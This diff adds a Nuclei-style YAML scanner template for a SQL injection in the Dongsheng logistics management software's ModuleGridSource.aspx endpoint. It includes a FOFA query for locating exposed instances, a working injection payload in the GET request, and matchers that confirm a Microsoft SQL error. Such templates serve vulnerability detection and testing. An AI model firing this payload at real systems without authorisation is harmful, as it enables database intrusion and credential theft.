@@ -1,0 +1,24 @@
+id: dongsheng-logistics-modulegridsource-ashx-sqli
+
+info:
+  name: "东胜物流软件ModuleGridSource.aspx存在SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="东胜物流软件-物流软件"
+    东胜物流信息管理系统中的 ModuleGridSource.aspx 接口存在 SQL 注入风险。攻击者无需认证即可利用该漏洞窃取数据库敏感数据（如管理员凭证及用户信息）。在特定高权限场景下，攻击者甚至可通过 SQL 注入向服务器写入恶意文件，从而获取系统控制权。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    GET /Modules/ModuleGridSource.aspx?handle=list&search=name:a%')and+<@@VERSION-- HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+      - 'Microsoft SQL'
+      - "nvarchar"
+    condition: and
